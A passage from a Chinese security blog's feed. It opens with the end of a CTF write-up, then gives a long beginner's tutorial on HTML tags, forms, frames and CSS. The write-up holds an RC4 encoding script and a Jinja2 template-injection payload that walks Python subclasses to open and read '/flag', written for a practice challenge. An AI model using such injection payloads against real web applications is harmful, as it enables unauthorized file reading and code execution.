src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150631904.png" alt="image-20220403150631904"></p><p>找到了加密方式是RC4,存在render，应该是模板注入</p><p>这是一个RC4加密脚本</p><pre><code>import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):    # print(&quot;RC4加密主函数&quot;)    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可    # print(&quot;原来的 s 盒：%s&quot; % s_box)    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)    return s_boxdef rc4_excrypt(plain, box):    # print(&quot;调用加密程序成功。&quot;)    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    # print(&quot;res用于加密字符串，加密后是：%res&quot; %res)    cipher = &quot;&quot;.join(res)    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))    #print(&quot;加密后的输出(经过编码):&quot;)    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;&quot;)</code></pre><p>首先列出所有子类</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151137684.png" alt="image-20220403151137684"></p><p>传给secret</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151206120.png" alt="image-20220403151206120"></p><p>寻找可利用子类</p><p>给出一个脚本</p><p>find.py</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;subprocess.Popen&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>寻找warnings.catch_warnings类</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152312044.png" alt="image-20220403152312044"></p><p>payload</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__['__builtins__']['open']('/flag').read()&#125;&#125;</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152255110.png" alt="image-20220403152255110"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;题目列表&quot;&gt;&lt;a href=&quot;#题目列表&quot; class=&quot;headerlink&quot; title=&quot;题目列表&quot;&gt;&lt;/a&gt;题目列表&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Web方向：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[b01lers2020]Welco</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="https://sakurahack-y.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>html学习笔记</title>
    <link href="https://sakurahack-y.github.io/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://sakurahack-y.github.io/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-03-24T07:11:45.000Z</published>
    <updated>2022-03-26T16:51:46.402Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="简单的HTML页面架构"><a href="#简单的HTML页面架构" class="headerlink" title="简单的HTML页面架构"></a>简单的HTML页面架构</h1><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;charset  编码 gbk gbk2312 utf-8</code></pre><h1 id="HTML常见标签"><a href="#HTML常见标签" class="headerlink" title="HTML常见标签"></a>HTML常见标签</h1><h2 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h2><pre><code class="html">&lt;meta&gt; 元素可提供有关页面的元信息（meta-information），比如针对搜索引擎和更新频度的描述和关键词。设置网站关键字meta name=&quot;keywords&quot; content=&quot;网络安全，WEB渗透，数据安全，渗透测试，安全培训&quot; /&gt;&lt;link&gt; 标签定义文档与外部资源的关系。&lt;script&gt; 引入js文件注释&lt;!--这是一段注释。注释不会在浏览器中显示。--&gt;&lt;p&gt;这是一段普通的段落。&lt;/p&gt;</code></pre><p>简单demo</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;这里是sakura的博客&lt;/title&gt;        &lt;meta name=&quot;keywords&quot; content=&quot;网络安全，渗透测试，代码审计&quot;/&gt;        &lt;meta name=&quot;description&quot; content=&quot;这是sakura的博客，分享自己的学习经验&quot; /&gt;        &lt;meta name=&quot;author&quot; content=&quot;sakura&quot; /&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>效果图:</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324154159328.png" alt="image-20220324154159328"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324154219201.png" alt="image-20220324154219201"></p><h2 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h2><pre><code class="html">由大到小&lt;h1&gt;h1&lt;/h1&gt;&lt;h2&gt;h2&lt;/h2&gt;&lt;h3&gt;h3&lt;/h3&gt;&lt;h4&gt;h4&lt;/h4&gt;&lt;h5&gt;h5&lt;/h5&gt;&lt;h6&gt;6&lt;/h6&gt;&lt;/br&gt; 换行标签&lt;hr&gt;换行线标签</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324155054152.png" alt="image-20220324155054152"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324155038536.png" alt="image-20220324155038536"></p><h2 id="文本属性"><a href="#文本属性" class="headerlink" title="文本属性"></a>文本属性</h2><pre><code class="html">&lt;strong&gt;加粗&lt;/strong&gt;&lt;b&gt;&lt;/b&gt;加粗&lt;i&gt;&lt;/i&gt;斜体&lt;u&gt;&lt;/u&gt; 下划线&lt;sup&gt;&lt;/sup&gt;上标&lt;sub&gt;&lt;/sub&gt;下标&lt;del&gt;&lt;/del&gt; 删除线&lt;font&gt;&lt;/font&gt; 规定字体属性    size 字体的大小    color 字体颜色    代码样式原样输出&lt;pre&gt;&lt;/pre&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324163340955.png" alt="image-20220324163340955"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324162943229.png" alt="image-20220324162943229"></p><h2 id="form表单"><a href="#form表单" class="headerlink" title="form表单"></a>form表单</h2><p>form表单 规定当提交表单时向何处发送表单数据</p><p>method 提交的方法有 get、post</p><p>规定在发送表单数据之前如何对其进行编码：</p><p><strong>enctype 属性可能的值：</strong></p><p>​        application/x-www-form-urlencoded</p><p>​        multipart/form-data</p><p>​        text/plain</p><p><strong>input标签:</strong></p><p>name：同样是表示的该文本输入框名称。</p><p>size：输入框的长度大小。</p><p>maxlength：输入框中允许输入字符的最大数。</p><p>value：输入框中的默认值</p><p>readonly：表示该框中只能显示，不能添加修改。</p><p><strong>input的类型:</strong></p><p>type=password 密码输入框</p><p>type=file 文件上传</p><p>type=hidden 隐藏域</p><p>button 按钮</p><p>checkbox 复选框</p><p>radio 单选框</p><p>type=submit 提交按钮</p><p>type=reset  重置按钮</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;这是一个表单e&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;            &lt;label&gt;用户名: &lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; size=&quot;30&quot; maxlength=&quot;6&quot; value=&quot;sakura&quot; readonly=&quot;&quot; /&gt;&lt;/br&gt;            &lt;label&gt;密&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;码:&lt;/label&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;  /&gt;&lt;/br&gt;            &lt;label&gt;技&amp;nbsp;能:&lt;/label&gt;安全开发&lt;input type=&quot;checkbox&quot; /&gt;渗透测试&lt;input type=&quot;checkbox&quot; /&gt;&lt;/br&gt;            &lt;label&gt;性&amp;nbsp;别:&lt;/label&gt;男&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;1&quot; /&gt;女&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;2&quot; /&gt;            &lt;input type=&quot;hidden&quot; value=&quot;1&quot; /&gt;&lt;/br&gt;            &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;            &lt;input type=&quot;reset&quot; value=&quot;重置&quot; /&gt;            &lt;input type=&quot;button&quot; value=&quot;button&quot; /&gt;        &lt;/form&gt;        &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;            &lt;input type=&quot;file&quot; value=&quot;file&quot; /&gt;            &lt;input type=&quot;submit&quot; /&gt;        &lt;/form&gt;            &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324210305845.png" alt="image-20220324210305845"></p><h2 id="a标签、img标签、table标签"><a href="#a标签、img标签、table标签" class="headerlink" title="a标签、img标签、table标签"></a>a标签、img标签、table标签</h2><pre><code class="html">a标签的作用：就是用于控制界面与页面之间的跳转默认就是selfself：用于在当前选项卡中跳转，也就是不新建页面跳转_blank ：用于在新的选项卡中跳转，也就是新建页面跳转&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;self&quot;&gt;百度&lt;/a&gt;&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;百度&lt;/a&gt;_blank    在新窗口中打开被链接文档。_self    默认。在相同的框架中打开被链接文档。_parent    在父框架集中打开被链接文档。_top    在整个窗口中打开被链接文档。</code></pre><h2 id="锚文本"><a href="#锚文本" class="headerlink" title="锚文本"></a>锚文本</h2><pre><code class="html">&lt;a name=&quot;top&quot;&gt;锚点&lt;/a&gt;&lt;a href=&quot;#top&quot;&gt;锚点&lt;/a&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324212519652.png" alt="image-20220324212519652"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324212536673.png" alt="image-20220324212536673"></p><h2 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h2><pre><code class="html">img 元素向网页中嵌入一幅图像。&lt;img src=&quot;img/sakura.jpg&quot; width=&quot;400&quot; height=&quot;500&quot; alt=&quot;logo&quot;/&gt;alt 规定图像的替代文本。src  规定显示图像的urlwidth 规定图片的高度height 规定图片的宽度</code></pre><p>  <img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324213845918.png" alt="image-20220324213845918"></p><h2 id="table表格"><a href="#table表格" class="headerlink" title="table表格"></a>table表格</h2><pre><code class="html">&lt;caption&gt;我的标题&lt;/caption&gt;表格带标题border 边框width 宽度height 高度colspan 合并行rowspan 合并竖&lt;th&gt;&lt;/th&gt; 定义表格内的表头单元格&lt;tr&gt;行&lt;/tr&gt;&lt;td&gt;表格&lt;/td&gt;cellpadding 单元边与内容的空白cellspacing 单元格的空白</code></pre><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;table border=&quot;1&quot; cellpadding=&quot;10&quot; cellspacing=&quot;10&quot;&gt;            &lt;caption&gt;HY和WYF❤&lt;/caption&gt;            &lt;tr&gt;&lt;th&gt;#&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;年龄&lt;/th&gt;&lt;th&gt;在一起时间&lt;/th&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;HY&lt;/td&gt;&lt;td&gt;20&lt;/td&gt;&lt;td rowspan=&quot;2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;299天&lt;/td&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;WYF&lt;/td&gt;&lt;td&gt;20&lt;/td&gt;&lt;/tr&gt;        &lt;/table&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324220335722.png" alt="image-20220324220335722"></p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><pre><code class="html">&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><pre><code class="html">    项目符号 square circle disc&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324221810168.png" alt="image-20220324221810168"></p><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><pre><code class="html">    数字列表 默认 数字    小写字母列表     大写字母列表 A    罗马字母列表  I    小写罗马字母列表 i&lt;ol type=&quot;1&quot;&gt; &lt;!--有序列表--&gt;            &lt;li&gt;暗月实战项目九 不出网的情况下的内网多域控渗透&lt;/li&gt;            &lt;li&gt;xp/2003开关3389指令&lt;/li&gt;            &lt;li&gt;一条命令修改windows注册表&lt;/li&gt;&lt;/ol&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324222526957.png" alt="image-20220324222526957"></p><h2 id="框架使用"><a href="#框架使用" class="headerlink" title="框架使用"></a>框架使用</h2><p><strong>frameset 元素可定义一个框架集。它被用来组织多个窗口（框架）。每个框架存有独立的文档。在其最简单的应用中，frameset 元素仅仅会规定在框架集中存在多少列或多少行。您必须使用 cols 或 rows 属性。</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/clip_image002.png" alt="布局"></p><p>frameset 在一个页面中设置一个或多个框架 不能嵌套在body标签里</p><p>iframe 是在html页面内嵌入框架 框架内可以连接另一个页面</p><p> <strong>frameset属性:</strong></p><p>①border</p><p>设置框架的边框粗细。</p><p>②bordercolor</p><p>设置框架的边框颜色。</p><p>③frameborder</p><p>设置是否显示框架边框。设定值只有0、1；0 表示不要边框，1 表示要显示边框。</p><p>④cols</p><p>纵向分割页面。其数值表示方法有三种：“30%、30（或者30px）、<em>”；数值的个数代表分成的视窗数目且数值之间用“,”隔开。“30%”表示该框架区域占全部浏览器页面区域的30%；“30”表示该区域横向宽度为30像素；“</em>”表示该区域占用余下页面空间。例如：cols=”25%,200,*” 表示将页面分为三部分，左面部分占页面30%，中间横向宽度为200像素，页面余下的作为右面部分。</p><p>⑤rows</p><p>横向分割页面。数值表示方法与意义与cols相同。</p><p>⑥framespacing</p><p>设置框架与框架间的保留的空白距离。</p><p> <strong>frame属性:</strong></p><p>①name</p><p>设置框架名称。此为必须设置的属性。</p><p>②src</p><p>设置此框架要显示的网页名称或路径。此为必须设置的属性。</p><p>③scrolling</p><p>设置是否要显示滚动条。设定值为auto, yes, no。</p><p>auto 在需要的情况下出现滚动条（默认值）</p><p>yes 始终显示滚动条（即使不需要）</p><p>no  从不显示滚动条（即使需要）</p><p>④bordercolor</p><p>设置框架的边框颜色。</p><p>⑤frameborder</p><p>设置是否显示框架边框。设定值只有0、1；0 表示不要边框，1 表示要显示边框。</p><p>⑥noresize</p><p>设置框架大小是否能手动调节。</p><p>⑦marginwidth</p><p>设置框架边界和其中内容之间的宽度。</p><p>⑧marginhight</p><p>设置框架边界和其中内容之间的高度。</p><p>⑨width</p><p>设置框架宽度。</p><p>⑩height</p><p>设置框架高度。</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324235313862.png" alt="image-20220324235313862"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324235247186.png" alt="image-20220324235247186"></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;frameset rows=&quot;50%,50%&quot;&gt;         &lt;frame src=&quot;https://nsl.lenovo.com.cn/&quot; scrolling=&quot;no&quot; /&gt;        &lt;frame src=&quot;http://www.sogou.com&quot; /&gt;    &lt;/frameset&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324224952975.png" alt="image-20220324224952975" style="zoom:50%;"><hr><h1 id="div-css"><a href="#div-css" class="headerlink" title="div css"></a>div css</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p><p>CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。</p><p>DIV是html的一个标签 css是一个样式表</p><h2 id="样式表类型"><a href="#样式表类型" class="headerlink" title="样式表类型"></a>样式表类型</h2><h3 id="嵌入式样式表"><a href="#嵌入式样式表" class="headerlink" title="嵌入式样式表"></a>嵌入式样式表</h3><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;        &lt;style&gt;            .demo01&#123;                color: mediumvioletred;                width: 1000px;                height: 500px;                background: salmon;            &#125;        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div class=&quot;demo01&quot;&gt;            人生若只如初见，何事秋风悲画扇        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325210711988.png" alt="image-20220325210711988"></p><h3 id="外部样式"><a href="#外部样式" class="headerlink" title="外部样式"></a>外部样式</h3><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;/&gt;@import url@import url(&quot;g.css&quot;);.demo1&#123;                color: red;                width: 100px;                height: 100px;                background: blue;            &#125;</code></pre><p><strong>1、link直接引用</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325211849732.png" alt="image-20220325211849732"></p><p><strong>2、在外部再引用外部</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325212537499.png" alt="image-20220325212537499"></p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325212557848.png" alt="image-20220325212557848" style="zoom:50%;"><h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><pre><code class="html">&lt;div style=&quot;color: blue;width: 100px;height: 100px; background: black;&quot;&gt;demo2&lt;/div&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325213538813.png" alt="image-20220325213538813"></p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><pre><code class="html">/* */ 注释内容</code></pre><h2 id="样式选择器"><a href="#样式选择器" class="headerlink" title="样式选择器"></a>样式选择器</h2><pre><code class="html">元素选择器   div&#123;属性:值&#125;ID选择器  #id&#123;属性:值&#125;class选择器  .类名&#123;属性:值&#125;子选择器    元数 空格 元素&#123;属性:值&#125;后代选择器  元数 &gt; 元数&#123;属性:值&#125;属性选择器  元素[属性]&#123;&#125;通配符选择器  *&#123;属性:值&#125;群组选择器  把相同的元素写在一起</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325220117278.png" alt="image-20220325220117278"></p><p><strong>通配符选择器示意</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325220708388.png" alt="image-20220325220708388"></p><p><strong>群组选择器</strong></p><p>把相同的元素写在一起，减少重复代码</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325221110722.png" alt="image-20220325221110722"></p><p><strong>子选择器/后代选择器</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325222155359.png" alt="image-20220325222155359"></p><h2 id="背景和边框"><a href="#背景和边框" class="headerlink" title="背景和边框"></a>背景和边框</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>background-color   规定要使用的背景颜色。</p><p>background-position    规定背景图像的位置。    </p><p>background-size     规定背景图片的尺寸。    </p><p>background-repeat  规定如何重复背景图像。  </p><pre><code>repeat  默认。背景图像将在垂直方向和水平方向重复。repeat-x 背景图像将在水平方向重复。repeat-y 背景图像将在垂直方向重复。no-repeat   背景图像将仅显示一次。inherit  规定应该从父元素继承 background-repeat 属性的设置。</code></pre><p>background-origin  规定背景图片的定位区域。    </p><p>background-clip     规定背景的绘制区域。    </p><p>background-attachment  规定背景图像是否固定或者随着页面的其余部分滚动。    </p><pre><code class="html">背景图片的滚动背景图片是否随着内容的滚动而滚动由background-attachment设置background-attachment:fixed; 固定，不随内容的滚动而滚动background-attachment:scroll; 滚动，随内容的滚动而滚动</code></pre><p>background-image  规定要使用的背景图像。</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325224711431.png" alt="image-20220325224711431"></p><p>上述body可直接简写为</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325224906687.png" alt="image-20220325224906687"></p><p>inherit  规定应该从父元素继承 background 属性的设置。  </p><p>left top</p><p>left center</p><p>left bottom</p><p>right top</p><p>right center</p><p>right bottom</p><p>center top</p><p>center center</p><p>center bottom</p><h3 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h3><p>边框颜色 border-color:#000</p><p>边框宽度 border-width:1px;</p><p>border-left 设置左边框，一般单独设置左边框样式使用</p><p>border-right 设置右边框，一般单独设置右边框样式使用</p><p>border-top 设置上边框，一般单独设置上边框样式使用</p><p>border-bottom 设置下边框，一般单独设置下边框样式使用,有时可将下边框样式作为css下划线效果应用。</p><p><strong>边框样式值如下：</strong></p><p>none : 　无边框。与任何指定的border-width值无关</p><p>hidden : 　隐藏边框。IE不支持</p><p>dotted : 　在MAC平台上IE4+与WINDOWS和UNIX平台上IE5.5+为点线。否则为实线（常用）</p><p>dashed : 　在MAC平台上IE4+与WINDOWS和UNIX平台上IE5.5+为虚线。否则为实线（常用）</p><p>solid : 　实线边框（常用）</p><p>double : 　双线边框。两条单线与其间隔的和等于指定的border-width值</p><p><strong>上 右 下左：</strong></p><p>groove : 　根据border-color的值画3D凹槽</p><p>ridge : 　根据border-color的值画菱形边框</p><p>inset : 　根据border-color的值画3D凹边</p><p>outset : 　根据border-color的值画3D凸边</p><p><strong>上 右 下左 简写：</strong></p><p>border:5px solid red;</p><p> <img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325231755509.png" alt="image-20220325231755509"></p><h2 id="文字属性"><a href="#文字属性" class="headerlink" title="文字属性"></a>文字属性</h2><p>color:red; 文字颜色 #ffeeees</p><p>font-size:12px; 文字大小</p><p>font-weight:bolds 文字粗细(bold/normal)</p><p>font-family:”宋体”文字字体</p><p>font-variant:small-caps小写字母以大写字母显示</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326001639314.png" alt="image-20220326001639314"></p><h2 id="文本属性-1"><a href="#文本属性-1" class="headerlink" title="文本属性"></a>文本属性</h2><p>text-align:center; 文本对齐(right/left/center)</p><p>line-height:10px; 行间距(可通过它实现文本的垂直居中)</p><p>text-indent:20px; 首行缩进</p><p>text-decoration:none;</p><p>文本线(none/underline/overline/line-through) underline/overline/line-through; 定义文本上的下划线/上划线/中划线</p><p>letter-spacing: 字间距</p><p>文本域示例:</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326004753645.png" alt="image-20220326004753645"></p><h2 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h2><p>list-style-type   设置列表项标记的类型。参阅：list-style-type 中可能的值。</p><p>list-style-image 使用图像来替换列表项的标记。参阅：list-style-image 中可能的值。</p><p>inherit  规定应该从父元素继承 list-style 属性的值</p><pre><code>取值:​    disc: 点​    circle: 圆圈​    square: 正方形​    decimal: 数字​    decimal-leading-zero: 十进制数，不足两位的补齐前导0，例如: 01, 02, 03, ..., 98, 99​    lower-roman: 小写罗马文字，例如: i, ii, iii, iv, v, ...​    upper-roman: 大写罗马文字，例如: I, II, III, IV, V, ...​    lower-greek: 小写希腊字母，例如: α(alpha), β(beta), γ(gamma), ...​    lower-latin: 小写拉丁文，例如: a, b, c, ... z​    upper-latin: 大写拉丁文，例如: A, B, C, ... Z​    armenian: 亚美尼亚数字​    georgian: 乔治亚数字，例如: an, ban, gan, ..., he, tan, in, in-an, ...​    lower-alpha: 小写拉丁文，例如: a, b, c, ... z​    upper-alpha: 大写拉丁文，例如: A, B, C, ... Z​    none: 无(取消所有的list样式)​    inherit:继承</code></pre><p>list-style-position   设置在何处放置列表项标记。参阅：list-style-position 中可能的值。</p><pre><code>inside列表项目标记放置在文本以内，且环绕文本根据标记对齐。outside默认值。保持标记位于文本的左侧。列表项目标记放置在文本以外，且环绕文本不根据标记对齐。简写list-style:square inside url(&#39;/i/arrow.gif&#39;);</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326011302577.png" alt="image-20220326011302577"></p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><pre><code>a&#123;text-decoration: none;&#125;a:link &#123;color:#FF0000;&#125; /* 未访问的链接 */a:visited &#123;color:#00FF00;&#125; /* 已访问的链接 */a:hover &#123;color:#FF00FF;&#125; /* 鼠标划过链接 */a:active &#123;color:#0000FF;&#125; /* 已选中的链接 */</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326012956179.png" alt="image-20220326012956179"></p><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326171556178.png" alt="image-20220326171556178"></p><p>盒子模型的组成部分：</p><p>外边距（margin）、边框（border）、内边距（padding）、内容（content）四个属性</p><p>自身的身高:width height </p><p>内边距: padding</p><p>盒子边框:border</p><p>与其他盒子的距离 margin 外边距</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326172438006.png" alt="image-20220326172438006"></p><h2 id="border边框"><a href="#border边框" class="headerlink" title="border边框"></a>border边框</h2><p>常见的写法 border:1px solid 